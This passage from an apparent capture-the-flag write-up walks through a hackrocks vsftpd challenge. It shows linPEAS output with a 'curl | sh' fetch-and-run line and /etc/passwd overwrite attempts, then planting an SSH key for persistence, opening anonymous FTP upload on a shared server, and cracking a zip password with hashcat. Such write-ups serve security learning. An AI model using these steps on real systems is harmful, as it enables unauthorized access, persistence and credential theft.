/run/screen
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1001
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/log/vsftpd.log.1
/var/log/vsftpd.log.2
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files

╔══════════╣ Searching passwords in history files
sudo -l
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cp /etc/passwd /tmp/passwd.bak
./exp /etc/passwd 1 ootz:
su rootz
su root
su ootz
su ootz:
cat /etc/passwd
./exp /etc/passwd 1 ootz:
su rootz
./exp /etc/passwd 1 "${$(cat /etc/passwd)/root:x/oot:}"
./exp /etc/password 1 "${$(cat /etc/passwd)/root:x/oot:}"
./exp /etc/password 1 ootz
./exp /etc/passwd 1 "${$(cat /etc/passwd)/root:x/oot:}"
./exp /etc/passwd 1 ootz:
su
su

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/home/ftpuser/.old_credentials.zip
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/grub/x86_64-efi/legacy_password_test.mod
/usr/lib/grub/x86_64-efi/password.mod
/usr/lib/grub/x86_64-efi/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-38.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/14927646/sem/config_set_passwords
/var/lib/cloud/instances/18352186/sem/config_set_passwords
/var/lib/cloud/instances/20954932/sem/config_set_passwords
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/fwupd/pki/secret.key
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
2021-10-08 09:09:05,442 - subp.py[DEBUG]: Running command ['passwd', '-l', 'root'] with allowed return codes [0] (shell=False, capture=True)
2021-10-08 09:09:07,362 - cc_set_passwords.py[DEBUG]: Handling input for chpasswd as multiline string.
2021-10-08 09:09:07,362 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/14927646/sem/config_set_passwords - wb: [644] 23 bytes
2021-10-08 09:09:07,363 - cc_set_passwords.py[DEBUG]: Changing password for ['root']:
2021-10-08 09:09:07,363 - subp.py[DEBUG]: Running command ['chpasswd'] with allowed return codes [0] (shell=False, capture=True)
2021-10-08 09:09:07,390 - subp.py[DEBUG]: Running command ['passwd', '--expire', 'root'] with allowed return codes [0] (shell=False, capture=True)
2021-10-08 09:09:07,404 - cc_set_passwords.py[DEBUG]: Expired passwords for: ['root'] users
2021-10-08 09:09:07,405 - ssh_util.py[DEBUG]: line 124: option PasswordAuthentication already set to yes
2021-10-08 09:09:07,406 - cc_set_passwords.py[DEBUG]: No need to restart SSH service, PasswordAuthentication not updated.
2021-10-08 09:09:07,406 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2021-10-08 09:14:21,456 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-08 09:14:21,456 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-08 12:23:49,697 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-08 12:23:49,697 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-08 21:27:42,864 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-08 21:27:42,864 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-11 12:59:07,814 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-11 12:59:07,814 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-11 14:33:24,084 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-11 14:33:24,084 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-13 16:15:19,755 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-13 16:15:19,755 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-18 08:56:09,436 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-18 08:56:09,436 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-18 09:04:57,579 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-18 09:04:57,579 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-02-28 19:19:46,620 - subp.py[DEBUG]: Running command ['passwd', '-l', 'root'] with allowed return codes [0] (shell=False, capture=True)
2022-02-28 19:19:49,984 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/18352186/sem/config_set_passwords - wb: [644] 24 bytes
2022-02-28 19:19:49,985 - cc_set_passwords.py[DEBUG]: Changing password for ['root']:
2022-02-28 19:19:49,985 - cc_set_passwords.py[DEBUG]: Handling input for chpasswd as multiline string.
2022-02-28 19:19:49,985 - subp.py[DEBUG]: Running command ['chpasswd'] with allowed return codes [0] (shell=False, capture=True)
2022-02-28 19:19:50,020 - subp.py[DEBUG]: Running command ['\x1b[1;31mpasswd', '--expire', 'root'] with allowed return codes [0] (shell=False, capture=True)
2022-02-28 19:19:50,036 - cc_set_passwords.py[DEBUG]: Expired passwords for: ['root'] users
2022-02-28 19:19:50,037 - cc_set_passwords.py[DEBUG]: No need to restart SSH service, PasswordAuthentication not updated.
2022-02-28 19:19:50,037 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2022-02-28 19:19:50,037 - ssh_util.py[DEBUG]: line 124: option PasswordAuthentication already set to yes
2022-02-28 19:23:47,692 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-02-28 19:23:47,692 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-03-04 16:58:08,693 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-03-04 16:58:08,694 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-03-08 10:39:16,593 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-03-08 10:39:16,593 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-01 14:42:09,589 - subp.py[DEBUG]: Running command ['passwd', '-l', 'root'] with allowed return codes [0] (shell=False, capture=True)
2022-06-01 14:42:12,308 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/20954932/sem/config_set_passwords - wb: [644] 24 bytes
2022-06-01 14:42:12,309 - cc_set_passwords.py[DEBUG]: Changing password for ['root']:
2022-06-01 14:42:12,309 - cc_set_passwords.py[DEBUG]: Handling input for chpasswd as multiline string.
2022-06-01 14:42:12,309 - subp.py[DEBUG]: Running command ['chpasswd'] with allowed return codes [0] (shell=False, capture=True)
2022-06-01 14:42:12,346 - subp.py[DEBUG]: Running command ['passwd', '--expire', 'root'] with allowed return codes [0] (shell=False, capture=True)
2022-06-01 14:42:12,366 - cc_set_passwords.py[DEBUG]: Expired passwords for: ['root'] users
2022-06-01 14:42:12,368 - cc_set_passwords.py[DEBUG]: No need to restart SSH service, PasswordAuthentication not updated.
2022-06-01 14:42:12,368 - ssh_util.py[DEBUG]: line 124: option PasswordAuthentication already set to yes
2022-06-01 14:42:12,369 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2022-06-10 07:55:48,476 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-10 07:55:48,477 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-06-10 08:01:19,566 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-06-10 08:01:19,566 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-10 08:16:17,206 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-06-10 08:16:17,206 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-10 08:31:18,732 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-06-10 08:31:18,732 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-10 08:46:18,765 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-06-10 08:46:18,765 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-10 09:01:18,338 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-06-10 09:01:18,338 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-10 09:16:18,476 - handlers.py[DEBUG]: finish: modules-config/config-set-passw\x1b[0mords: SUCCESS: config-set-passwords previously ran
2022-06-10 09:16:18,476 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-10 09:31:18,737 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-06-10 09:31:18,737 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-06-10 09:46:18,620 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-06-10 09:46:18,620 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
{{< /highlight >}}
</details>
<br>

If you look closely, linPEAS shows us that we can modify files inside ftpuser/.ssh , so...


...what I did next is, put my newly generated public RSA key on <code>/home/ftpuser/.ssh/authorized_keys</code> so that I could gain access with ssh instead of relying on the vsftpd exploit.

On my local computer:

{{< highlight bash >}}
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/user/.ssh/id_rsa
Your public key has been saved in /home/user/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:hash user@domain
The key's randomart image is:
+---[RSA 3072]----+
...
+----[SHA256]-----+

$ cat /home/user/.ssh/id_rsa.pub
ssh-rsa very_large_sequence_of_digits_numbers
{{< /highlight >}}

On the remote server:

{{< highlight bash >}}
$ echo "ssh-rsa very_large_sequence_of_digits_numbers" > /home/ftpuser/.ssh/authorized_keys
{{< /highlight >}}

Then on our computer:

![works](/images/ctfs/nuclio_cyberhack/ftpando/ssh_access.png)

It... worked... we now have a reliable way of interacting with the server via ssh, this gets rid of the unstable vsftpd exploit.

While you could try all the Privilege Escalation methods you can think of, every one that you try is patched (Even though it's Ubuntu Focal Fossa, it contains security backports as it's an LTS); so say goodbye to all <code>Baron Samedit</code>'s, <code>PolicyKit</code> Privesc's and such.

Also, the machine was 'global' in the sense that each user interacted with the _same_ machine, so you can effectively find traces of other user's tries on the <code>/home/ftuser</code> directory which is kinda of a bummer as it may hint other users that are
clever enough to fiddle with <code>.bash_history</code> and so.

If you look for hidden files, you'll see that there's an interesting file laying on the folder, it's called <code>.old_credentials.zip</code> and we should try to analyze it on
our local machine; to do so, what I did is modify <code>/etc/vsftpd.conf</code> to look like this:

<details>
<summary>Original:</summary>
<br>
{{< highlight bash >}}
# Example config file /etc/vsftpd.conf
#
# The default compiled in settings are fairly paranoid. This sample file
# loosens things up a bit, to make the ftp daemon more usable.
# Please see vsftpd.conf.5 for all compiled in defaults.
#
# READ THIS: This example file is NOT an exhaustive list of vsftpd options.
# Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's
# capabilities.
#
#
# Run standalone?  vsftpd can run either from an inetd or as a standalone
# daemon started from an initscript.
listen=NO
listen_port=2121
run_as_launching_user=YES

# Configuracion específica para el juego
userlist_file=/etc/vsftpd.userlist
userlist_deny=NO

#
# This directive enables listening on IPv6 sockets. By default, listening
# on the IPv6 "any" address (::) will accept connections from both IPv6
# and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6
# sockets. If you want that (perhaps because you want to listen on specific
# addresses) then you must run two copies of vsftpd with two configuration
# files.
listen_ipv6=YES
#
# Allow anonymous FTP? (Disabled by default).
anonymous_enable=NO
#
# Uncomment this to allow local users to log in.
local_enable=YES
#
# Uncomment this to enable any form of FTP write command.
#write_enable=YES
#
# Default umask for local users is 077. You may wish to change this to 022,
# if your users expect that (022 is used by most other ftpd's)
#local_umask=022
#
# Uncomment this to allow the anonymous FTP user to upload files. This only
# has an effect if the above global write enable is activated. Also, you will
# obviously need to create a directory writable by the FTP user.
#anon_upload_enable=YES
#
# Uncomment this if you want the anonymous FTP user to be able to create
# new directories.
#anon_mkdir_write_enable=YES
#
# Activate directory messages - messages given to remote users when they
# go into a certain directory.
dirmessage_enable=YES
#
# If enabled, vsftpd will display directory listings with the time
# in  your  local  time  zone.  The default is to display GMT. The
# times returned by the MDTM FTP command are also affected by this
# option.
use_localtime=YES
#
# Activate logging of uploads/downloads.
#xferlog_enable=YES
#
# Make sure PORT transfer connections originate from port 20 (ftp-data).
connect_from_port_20=YES
#
# If you want, you can arrange for uploaded anonymous files to be owned by
# a different user. Note! Using "root" for uploaded files is not
# recommended!
#chown_uploads=YES
#chown_username=whoever
#
# You may override where the log file goes if you like. The default is shown
# below.
#xferlog_file=/home/oscar/vsftpd.log
#
# If you want, you can have your log file in standard ftpd xferlog format.
# Note that the default log file location is /var/log/xferlog in this case.
#xferlog_std_format=YES
#
# You may change the default value for timing out an idle session.
#idle_session_timeout=600
#
# You may change the default value for timing out a data connection.
#data_connection_timeout=120
#
# It is recommended that you define on your system a unique user which the
# ftp server can use as a totally isolated and unprivileged user.
#nopriv_user=nobody
#
# Enable this and the server will recognise asynchronous ABOR requests. Not
# recommended for security (the code is non-trivial). Not enabling it,
# however, may confuse older FTP clients.
#async_abor_enable=YES
#
# By default the server will pretend to allow ASCII mode but in fact ignore
# the request. Turn on the below options to have the server actually do ASCII
# mangling on files when in ASCII mode.
# Beware that on some FTP servers, ASCII support allows a denial of service
# attack (DoS) via the command "SIZE /big/file" in ASCII mode. vsftpd
# predicted this attack and has always been safe, reporting the size of the
# raw file.
# ASCII mangling is a horrible feature of the protocol.
#ascii_upload_enable=YES
#ascii_download_enable=YES
#
# You may fully customise the login banner string:
#ftpd_banner=Welcome to Hackrocks' FTP service.
#banner_file=/etc/vsftpd.banner
#
# You may specify a file of disallowed anonymous e-mail addresses. Apparently
# useful for combatting certain DoS attacks.
#deny_email_enable=YES
# (default follows)
#banned_email_file=/etc/vsftpd.banned_emails
#
# You may restrict local users to their home directories.  See the FAQ for
# the possible risks in this before using chroot_local_user or
# chroot_list_enable below.
#chroot_local_user=YES
#
# You may specify an explicit list of local users to chroot() to their home
# directory. If chroot_local_user is YES, then this list becomes a list of
# users to NOT chroot().
# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that
# the user does not have write access to the top level directory within the
# chroot)
#chroot_local_user=YES
#chroot_list_enable=YES
# (default follows)
#chroot_list_file=/etc/vsftpd.chroot_list
#
# You may activate the "-R" option to the builtin ls. This is disabled by
# default to avoid remote users being able to cause excessive I/O on large
# sites. However, some broken FTP clients such as "ncftp" and "mirror" assume
# the presence of the "-R" option, so there is a strong case for enabling it.
#ls_recurse_enable=YES
#
# Customization
#
# Some of vsftpd's settings don't fit the filesystem layout by
# default.
#
# This option should be the name of a directory which is empty.  Also, the
# directory should not be writable by the ftp user. This directory is used
# as a secure chroot() jail at times vsftpd does not require filesystem
# access.
secure_chroot_dir=/var/run/vsftpd/empty
#
# This string is the name of the PAM service vsftpd will use.
pam_service_name=vsftpd
#
# This option specifies the location of the RSA certificate to use for SSL
# encrypted connections.
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO

#
# Uncomment this to indicate that vsftpd use a utf8 filesystem.
#utf8_filesystem=YES
{{< /highlight >}}

</details>

<br>
<details>
<summary>Modified:</summary>
<br>
{{< highlight bash >}}
# Example config file /etc/vsftpd.conf
#
# The default compiled in settings are fairly paranoid. This sample file
# loosens things up a bit, to make the ftp daemon more usable.
# Please see vsftpd.conf.5 for all compiled in defaults.
#
# READ THIS: This example file is NOT an exhaustive list of vsftpd options.
# Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's
# capabilities.
#
#
# Run standalone?  vsftpd can run either from an inetd or as a standalone
# daemon started from an initscript.
listen=NO
listen_port=2121
run_as_launching_user=YES

# Configuracion específica para el juego
userlist_file=/etc/vsftpd.userlist
userlist_deny=NO

#
# This directive enables listening on IPv6 sockets. By default, listening
# on the IPv6 "any" address (::) will accept connections from both IPv6
# and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6
# sockets. If you want that (perhaps because you want to listen on specific
# addresses) then you must run two copies of vsftpd with two configuration
# files.
listen_ipv6=YES
#
# Allow anonymous FTP? (Disabled by default).
anonymous_enable=YES
#
# Uncomment this to allow local users to log in.
local_enable=YES
#
# Uncomment this to enable any form of FTP write command.
write_enable=YES
#
# Default umask for local users is 077. You may wish to change this to 022,
# if your users expect that (022 is used by most other ftpd's)
#local_umask=022
#
# Uncomment this to allow the anonymous FTP user to upload files. This only
# has an effect if the above global write enable is activated. Also, you will
# obviously need to create a directory writable by the FTP user.
anon_upload_enable=YES
#
# Uncomment this if you want the anonymous FTP user to be able to create
# new directories.
anon_mkdir_write_enable=YES
#
# Activate directory messages - messages given to remote users when they
# go into a certain directory.
dirmessage_enable=YES
#
# If enabled, vsftpd will display directory listings with the time
# in  your  local  time  zone.  The default is to display GMT. The
# times returned by the MDTM FTP command are also affected by this
# option.
use_localtime=YES
#
# Activate logging of uploads/downloads.
#xferlog_enable=YES
#
# Make sure PORT transfer connections originate from port 20 (ftp-data).
connect_from_port_20=YES
#
# If you want, you can arrange for uploaded anonymous files to be owned by
# a different user. Note! Using "root" for uploaded files is not
# recommended!
#chown_uploads=YES
#chown_username=whoever
#
# You may override where the log file goes if you like. The default is shown
# below.
#xferlog_file=/home/oscar/vsftpd.log
#
# If you want, you can have your log file in standard ftpd xferlog format.
# Note that the default log file location is /var/log/xferlog in this case.
#xferlog_std_format=YES
#
# You may change the default value for timing out an idle session.
#idle_session_timeout=600
#
# You may change the default value for timing out a data connection.
#data_connection_timeout=120
#
# It is recommended that you define on your system a unique user which the
# ftp server can use as a totally isolated and unprivileged user.
#nopriv_user=nobody
#
# Enable this and the server will recognise asynchronous ABOR requests. Not
# recommended for security (the code is non-trivial). Not enabling it,
# however, may confuse older FTP clients.
#async_abor_enable=YES
#
# By default the server will pretend to allow ASCII mode but in fact ignore
# the request. Turn on the below options to have the server actually do ASCII
# mangling on files when in ASCII mode.
# Beware that on some FTP servers, ASCII support allows a denial of service
# attack (DoS) via the command "SIZE /big/file" in ASCII mode. vsftpd
# predicted this attack and has always been safe, reporting the size of the
# raw file.
# ASCII mangling is a horrible feature of the protocol.
#ascii_upload_enable=YES
#ascii_download_enable=YES
#
# You may fully customise the login banner string:
#ftpd_banner=Welcome to Hackrocks' FTP service.
#banner_file=/etc/vsftpd.banner
#
# You may specify a file of disallowed anonymous e-mail addresses. Apparently
# useful for combatting certain DoS attacks.
#deny_email_enable=YES
# (default follows)
#banned_email_file=/etc/vsftpd.banned_emails
#
# You may restrict local users to their home directories.  See the FAQ for
# the possible risks in this before using chroot_local_user or
# chroot_list_enable below.
#chroot_local_user=YES
#
# You may specify an explicit list of local users to chroot() to their home
# directory. If chroot_local_user is YES, then this list becomes a list of
# users to NOT chroot().
# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that
# the user does not have write access to the top level directory within the
# chroot)
#chroot_local_user=YES
#chroot_list_enable=YES
# (default follows)
#chroot_list_file=/etc/vsftpd.chroot_list
#
# You may activate the "-R" option to the builtin ls. This is disabled by
# default to avoid remote users being able to cause excessive I/O on large
# sites. However, some broken FTP clients such as "ncftp" and "mirror" assume
# the presence of the "-R" option, so there is a strong case for enabling it.
#ls_recurse_enable=YES
#
# Customization
#
# Some of vsftpd's settings don't fit the filesystem layout by
# default.
#
# This option should be the name of a directory which is empty.  Also, the
# directory should not be writable by the ftp user. This directory is used
# as a secure chroot() jail at times vsftpd does not require filesystem
# access.
secure_chroot_dir=/var/run/vsftpd/empty
#
# This string is the name of the PAM service vsftpd will use.
pam_service_name=vsftpd
#
# This option specifies the location of the RSA certificate to use for SSL
# encrypted connections.
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO

#
# Uncomment this to indicate that vsftpd use a utf8 filesystem.
#utf8_filesystem=YES
{{< /highlight >}}

</details>
<br>
The idea behind is for us to get <code>anonymous</code> FTP login capabilities in order to grab the file using <code>get</code>.
<br>
<br>
I also fiddled with trying to upload root-chowned files, I thought that I could try to fiddle with those sort of binaries but decided
against it on the very last moment.

<br>
<br>

*NOTE*:
<br>
The machine reboots 4-5 times every hour, I didn't spend time looking for why it does it (Maybe a cron job?) but that's to be noted because
it allowed the machine to re-load our <code>vsftpd.conf</code> file.

We now connect to the machine using <code>ftp</code>:


{{< highlight bash >}}
$ ftp anonymous@caixa1.hackrocks.com 2121
Connected to caixa1.hackrocks.com.
220:
 _                _                   _        
| |__   __ _  ___| | ___ __ ___   ___| | _____ 
| '_ \ / _` |/ __| |/ / '__/ _ \ / __| |/ / __|
| | | | (_| | (__|   <| | | (_) | (__|   <\__ \
|_| |_|\__,_|\___|_|\_\_|  \___/ \___|_|\_\___/
                                               
       WELCOME to hackrocks FTP site
         (based on vsFTPd v.2.3.4)
    

ftp>
{{< /highlight >}}

Yay!

We'll navigate to /home/ftpuser and use the <code>get</code> command to download the <code>.old_credentials.zip</code>

We now have the file :)

*NOTE*:

For some reason I don't _quite_ get, someone (I suppose one of the organizers (Or a bunch of them)) started to rollback all my changes.
<br>
<br>
Disabling my SSH trick, FTP anon login...
<br>
<br>
I mean, they're 100% not intended but I made them specifically for me, you'd need to look for them
specifically to take advantage of them... (The authorized_keys only accepted a connection from my machine and the anon ftp login doesn't really harm
as vsftpd is already exploitable, so why not...)

We inspect the file and look for things inside, but, it's password protected :/

Now that we have the <code>.old_credentials.zip</code> file, we need to crack it's password.

What we'll do now is use <code>zip2john</code> to gather the zip file hash in order for <code>hashcat</code> to crack it:


{{< highlight bash >}}
$ zip2john .old_credentials.zip > hash.txt
ver 1.0 efh 5455 efh 7875 old_credentials.zip/credentials.txt PKZIP Encr: 2b chk, TS_chk, cmplen=61, decmplen=49, crc=11E0C751 ts=9061 cs=9061 type=0
{{< /highlight >}}

*NOTE*:

I had to change the format of the saved file from:

{{< highlight bash >}}
old_credentials.zip/credentials.txt:$pkzip$1*2*2*0*3d*31*11e0c751*0*49*0*3d*9061*be1551fd0fbeb952790735978db89e8b6bebcea72be1a76b10b872e27eda562b3fe6f575bf5d8fca2e53f0cd0280ce843e68c4aa573340f890e270cbf3*$/pkzip$:credentials.txt:old_credentials.zip::old_credentials.zip
{{< /highlight >}}

to:

{{< highlight bash >}}$pkzip$1*2*2*0*3d*31*11e0c751*0*49*0*3d*9061*be1551fd0fbeb952790735978db89e8b6bebcea72be1a76b10b872e27eda562b3fe6f575bf5d8fca2e53f0cd0280ce843e68c4aa573340f890e270cbf3*$/pkzip$
{{< /highlight >}}

else, hashcat complained about the signature...

So what's really left is cracking the hash with hashcat, in order to do so, I did it this way:

{{< highlight bash >}}
$ hashcat -a 3 -m 17210 hash.txt "?a?a?a?a?a?a"
hashcat (v6.2.5) starting

Successfully initialized ~.

OpenCL API (OpenCL 3.0 CUDA 11.7.57) - Platform #1 [~]
=======================================================================
* Device #1: ~

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 773 MB

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$pkzip$1*2*2*0*3d*31*11e0c751*0*49*0*3d*9061*be1551fd0fbeb952790735978db89e8b6bebcea72be1a76b10b872e27eda562b3fe6f575bf5d8fca2e53f0cd0280ce843e68c4aa573340f890e270cbf3*$/pkzip$:aaxl/?
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 17210 (PKZIP (Uncompressed))
Hash.Target......: $pkzip$1*2*2*0*3d*31*11e0c751*0*49*0*3d*9061*be1551...pkzip$
Time.Started.....: Wed Jun 15 18:38:19 2022 (57 secs)
Time.Estimated...: Wed Jun 15 18:39:16 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?a?a?a?a?a?a [6]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5444.0 MH/s (7.39ms) @ Accel:128 Loops:64 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 314104217600/735091890625 (42.73%)
Rejected.........: 0/314104217600 (0.00%)
Restore.Point....: 34734080/81450625 (42.64%)
Restore.Sub.#1...: Salt:0 Amplifier:896-960 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#1....: ub~qM7 -> jlEHPZ
Hardware.Mon.#1..: Temp: 79c Fan: 62% Util:100% Core:1860MHz Mem:5750MHz Bus:16

Started: Wed Jun 15 18:38:18 2022
Stopped: Wed Jun 15 18:39:17 2022
{{< /highlight >}}

You're probably wondering why I decided to use a <code>mask_attack</code>, truth is, that this CTF has been an absolute disaster, I explain it on the topmost folder of the challenges... take a glance over there as to why I used it.

The zip password is <code>aaxl/?</code>

We uncompress it and inside the <code>credentials.txt</code> file we find:

{{< highlight bash >}}
Greetings! The token for this game is SCLHNRWMAN
{{< /highlight >}}

Token: <code>SCLHNRWMAN</code>